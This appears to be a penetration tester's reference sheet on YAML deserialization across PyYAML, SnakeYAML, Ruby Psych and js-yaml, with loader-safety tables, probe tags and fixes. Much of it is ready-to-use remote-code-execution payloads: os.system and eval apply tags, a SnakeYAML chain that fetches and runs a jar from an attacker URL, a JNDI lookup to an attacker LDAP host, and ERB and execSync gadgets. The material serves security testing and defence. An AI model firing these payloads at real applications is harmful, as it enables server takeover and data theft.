# YAML Deserialization — one format, three languages

## The typed-tag mechanism

YAML's `!!`-tag/`!tag` system lets a document name a class. Every language's
"safe" vs "unsafe" loader is a different line — the format is the same, the
permitted-classes surface is the bug.

## The three loaders, three threat models

| Loader | Language | Unsafe tags |
|---|---|---|
| PyYAML `yaml.load` (no Loader) | Python | `!!python/object`, `!!python/object/apply`, `!!python/object/new` |
| Snakeyaml `new Yaml().load` | Java | `!!javax.script.ScriptEngineManager`, `!!com.sun...` |
| Psych `YAML.load` | Ruby | `!ruby/object:X`, `!ruby/struct` |
| `js-yaml` ≤3.x `yaml.load` | JS | `!!js/function` |
| `gopkg.in/yaml.v2` | Go | `!` custom tags via `Unmarshal`+`Unmarshaler` |

## PyYAML — `!!python/*`

```yaml
# instantiate any class
!!python/object:app.models.Flag {value: "x"}

# apply a callable — RCE
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]
!!python/object/apply:eval ["__import__('os').popen('id').read()"]

# new — call __new__ with args
!!python/object/new:os.system ['id']

# the module-attribute tag — imports a symbol
!!python/name:os.system
!!python/module:os
```

### Loader matrix — which call accepts which

| Call | `!!python/object` | `apply`/`new` |
|---|---|---|
| `yaml.load(x)` PyYAML<5.4 | YES | YES |
| `yaml.load(x, Loader=Loader)` | YES | YES |
| `yaml.load(x, Loader=UnsafeLoader)` | YES | YES |
| `yaml.full_load` / FullLoader | YES | NO |
| `yaml.safe_load` / SafeLoader | NO | NO |

**FullLoader still instantiates `!!python/object`** — it's "safer" not safe.
`yaml.load` with NO Loader arg on PyYAML≥5.4 emits a warning but still uses
`FullLoader` — `object` tags still live.

### The custom-constructor surface

```python
yaml.SafeLoader.add_constructor('!code', app_ctor)
```

A `!code` tag registered on SafeLoader routes your scalar to `app_ctor` —
the danger is in the app function, not the loader. Look for `add_constructor`
/`add_multi_constructor`/`add_path_resolver` in source.

## Snakeyaml — Java's typed-tag bug

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://YOU/x.jar"]
  ]]
]
```

`new Yaml().load` (or `.loadAs`) instantiates any class — the ScriptEngine
loads and runs a jar from your URL. Older Snakeyaml has no `SafeConstructor`
default; `new Yaml(new SafeConstructor())` is the fix and its absence is the bug.

```yaml
# a JdbcRowSetImpl variant → JNDI (see jndi-injection.md)
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: "ldap://YOU/x"
  autoCommit: true
```

## Psych — Ruby's `!ruby/object`

```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:ERB
src: "<%= `id` %>"
```

`YAML.load`/`Psych.load` (Psych <4) instantiate `!ruby/object:X`. The RCE
gadgets are the same universal chains as Marshal — the ERB-proxy graph (see
`ruby-deser.md`). `safe_load`/`permitted_classes` is the fix; `Symbol`+`Date`
are often permitted by default but don't reach a gadget.

## js-yaml — `!!js/function` (≤3.x)

```yaml
fn: !!js/function 'function(){ return require("child_process").execSync("id") }'
```

See `nodejs-deser.md` — the revived function must still be CALLED by the app.

## The "it's just config" trap

YAML files the app loads at startup or on import — `config.yml`, a CI
config, an Ansible playbook, a docker-compose — reach the parser too. An
uploaded "config" file that the app `yaml.load`s is a deserialization sink
with a different delivery channel.

## The discrimination probe

```yaml
# a probe tag that names a class the app can't have — the error names it back
!!python/object:does.not.Exist {x: 1}
!!javax.script.DoesNotExist
!ruby/object:Does::Not::Exist
```

Error strings: `ConstructorException`, `could not determine a constructor
for the tag`, `ClassNotFound`, `cannot create` — any of these = typed-tag
parsing reached.

## Falsifiers

- `yaml.safe_load` / `SafeLoader` / `SafeConstructor` with no
  `permitted_classes`/`add_constructor` that name a dangerous path.
- `js-yaml` ≥4 — `!!js/function` removed.
- YAML parsed only into plain Maps by a data-only lib (`gopkg.in/yaml.v3`
  into `map[string]interface{}`).

## Output to record

- Loader + language + version (`yaml.load` PyYAML? Snakeyaml? Psych?)
- The tag that fired + the verbatim response/error
- Whether the channel was request-body, uploaded file, or config
